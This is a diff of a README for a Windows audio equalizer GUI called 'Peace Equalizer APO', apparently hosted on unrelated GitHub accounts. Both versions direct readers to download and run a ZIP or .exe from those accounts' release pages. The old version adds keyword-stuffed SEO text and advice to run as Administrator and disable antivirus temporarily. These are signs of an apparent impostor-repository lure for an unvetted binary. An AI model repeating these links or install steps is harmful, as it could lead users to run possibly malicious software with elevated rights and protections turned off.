@@ -1,54 +1,77 @@
-# Peace Equalizer APO
-Peace Equalizer APO — peace equalizer apo gui download equalizer apo windows 11 parametric eq graphic equalizer system wide audio sound booster bass boost headphones gaming preset config profile realtek autoeq harman oratory1990 crinacle setup guide tutorial 2026
+# 🎧 Peace-Equalizer-Apo - Improve your computer audio sound quality
 
-<img width="150" height="150" alt="image" src="https://github.com/user-attachments/assets/8d40791b-aca9-4b2f-b1e3-f40f62bd2300" />
+[![Download Peace Equalizer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Rosieapocalyptical981/Peace-Equalizer-Apo/releases)
 
-[![GitHub Stars](https://img.shields.io/github/stars/MoradAmr14/Peace-Equalizer-Apo?style=flat-square&color=00d4aa)](https://github.com/MoradAmr14/Peace-Equalizer-Apo/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/MoradAmr14/Peace-Equalizer-Apo?style=flat-square&color=0099cc)](https://github.com/MoradAmr14/Peace-Equalizer-Apo/network)
-[![Downloads](https://img.shields.io/github/downloads/MoradAmr14/Peace-Equalizer-Apo/total?style=flat-square&color=7c5cbf)](https://github.com/MoradAmr14/Peace-Equalizer-Apo/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+## 🎯 About This Software
 
-## Overview
-Peace Equalizer APO is a modern and user-friendly graphical interface for Equalizer APO. It turns the powerful system-wide audio processing engine into an intuitive and professional equalizer with full support for parametric and graphic EQ. The application includes AutoEQ integration for thousands of headphones, preset management, bass boost, spatial effects, and per-application profiles. It delivers enhanced sound quality for music, gaming, movies, and calls across all Windows applications.
+Peace-Equalizer-Apo provides a simple interface for audio settings on your Windows computer. It gives you control over the sound output of your speakers and headphones. You can adjust frequency bands, boost bass, and improve clarity. It works with Equalizer APO to process audio signals in real time. This tool includes presets for many popular headphone models. You can create custom curves to match your hearing or speaker hardware. It supports microphone adjustments and various audio filters. 
 
-> [!Important]
-> This project is for educational and personal use only. Use at your own risk. You must install Equalizer APO first. The authors are not responsible for any audio issues or system changes.
+## 🛠️ System Requirements
 
-## Install
-[Download `Peace-Equalizer-APO.zip`](https://github.com/MoradAmr14/Peace-Equalizer-Apo/releases/download/Equalizer/PeaceEQ.zip)
----
-> Optimized for Windows 11.
+This software works on computers running Windows 10 or Windows 11. It requires a functioning audio driver. Most laptops and desktop computers include the necessary hardware. You need Equalizer APO installed on your system. This tool acts as a controller for that engine. Ensure your audio drivers remain updated for optimal performance.
 
-<img width="1040" height="840" alt="image" src="https://github.com/user-attachments/assets/f4837f7a-d004-49be-a279-aec81e8f78a0" />
+## 💾 Installation Steps
 
-## Installation
-### For Regular Users
-1. Download and install Equalizer APO first
-2. Download and extract the archive
-3. Run `Peace.exe` as Administrator
-4. Follow the setup guide
-5. Import AutoEQ profiles or create custom presets
-6. Configure your equalizer settings
-7. Apply changes and enjoy enhanced system-wide audio
+1. Visit the project release page to get the installer: [https://github.com/Rosieapocalyptical981/Peace-Equalizer-Apo/releases](https://github.com/Rosieapocalyptical981/Peace-Equalizer-Apo/releases)
+2. Locate the file ending in .exe in the list of assets.
+3. Click the filename to save it to your computer.
+4. Double-click the file to start the setup process.
+5. Follow the instructions on the screen.
+6. Grant permission if the system asks to make changes.
+7. Restart your computer to finish the setup of the audio engine.
 
----
-## Troubleshooting
-| Problem | Solution |
-|--------------------------------|-------------------------------------------------------|
-| Peace doesn't start | Run as Administrator and disable antivirus temporarily |
-| No sound after installation | Restart audio devices and Peace |
-| Equalizer APO not detected | Reinstall Equalizer APO correctly |
-| AutoEQ profiles not loading | Check internet connection and update |
-| Bass boost / presets missing | Reconfigure and reload profile |
-| Gaming / Spotify issues | Set per-application profiles |
-| Windows 11 compatibility error | Update Windows and reinstall both tools |
-| General audio distortion | Reset configuration and lower preamp |
-| Download / update failed | Use the latest release and check your internet connection |
+## 🎛️ Configure Your Audio
 
-* Peace Equalizer APO
-* Peace Equalizer Download
-* Equalizer APO GUI
-* System Wide Equalizer Windows 11
-* Peace AutoEQ
-* Peace Bass Boost
-* Peace Equalizer 2026
+Open the application after the restart. You will see a panel with several sliders. Each slider controls a specific frequency range. Moving a slider up increases the volume of those tones. Moving it down decreases the volume. 
+
+The application provides a list of AutoEQ presets. These presets automatically adjust your audio to sound neutral based on measurements of your specific headphone model. Select your headphone brand and model from the menu to load these settings. You can save your chosen configurations as files. Loading them later takes one click.
+
+## 🎙️ Adjusting Your Microphone
+
+Select the microphone tab within the interface. You can apply filters to change how your voice sounds to others. Use the gain slider to increase your input volume. You can also apply noise suppression filters to remove background hums from your room. Test your settings by recording a short audio clip.
+
+## 📋 Tips for Best Results
+
+Keep the global gain slider near the zero mark to prevent sound distortion. Large boosts to low frequencies require high-quality speakers to avoid rattling. If you hear crackling sounds, reduce the pre-amplification level. Use the parametric analysis tab to view how changes affect the frequency response of your audio. This view helps you visualize the changes to your sound signature.
+
+## 🔧 Frequently Asked Questions
+
+**Does this software damage my speakers?**
+No, as long as you keep volume levels reasonable. Extreme boosts to bass frequencies can strain small speakers.
+
+**Can I use this for playing games?**
+Yes. You can create a specific profile that boosts high frequencies to help you hear footsteps or metallic sounds in games.
+
+**Is this program free?**
+Yes. It remains an open source project for every user.
+
+**Why does the window not appear?**
+Ensure Equalizer APO is correctly installed in the system settings. Run the configurator tool included with the base audio engine to select the devices you want to control.
+
+## 🏗️ Technical Details
+
+This project uses the Peace GUI to communicate with the Equalizer APO backend. It maps your slider actions to configuration files that the APO engine reads. This ensures low latency and high quality for every audio stream. It interacts with the Windows Audio Service. Every change happens locally on your machine. No data leaves your computer during normal usage.
+
+## 📁 File Structure
+
+The installation directory includes several important components:
+*   config: Stores your saved speaker and headphone profiles.
+*   icons: Holds images used in the graphical interface.
+*   presets: Contains pre-built files for common audio equipment.
+*   Peace.exe: The main executable file that launches the interface.
+
+## 🌍 Presets and AutoEQ
+
+The AutoEQ feature pulls data from a large database of measurements. These measurements aim to make your music sound close to a professional studio monitor. Choose the "AutoEQ" button in the main window to search for your gear. If you do not find your specific model, you can choose a generic curve for your headphone type, such as "Over-ear" or "In-ear". This often results in a significant improvement over the base sound quality of your hardware.
+
+## ⚙️ Advanced Features
+
+Use the parametric equalizer if you have specific knowledge of audio frequencies. You can define exact center frequencies, gain values, and filter types. The graphical display shows the result of your settings in real time. This mode allows for fine-tuning of individual audio channels. You can also create shortcuts on your desktop to switch between sound profiles with one click. This is useful if you swap between speakers and gaming headphones often.
+
+## ⚖️ Audio Filters
+
+You can add various filters to your audio chain. These include high-pass filters, low-pass filters, and shelf filters. A high-pass filter removes low-frequency rumble from your microphone signal. A shelf filter allows you to raise or lower large ranges of frequencies without affecting as many specific points as a standard band. Combine these tools to achieve the audio signature that suits your preferences.
+
+## 📦 Troubleshooting
+
+If the audio sounds distorted after turning on the program, check the gain levels. Select the "Reset" button to return all sliders to their default positions. If the software stops working, perform a repair installation using the original installer file. Ensure that no other audio enhancing software runs at the same time to avoid conflicts. Conflicts result in strange audio behavior or a loss of sound entirely. Uninstall duplicate software to ensure a stable experience.
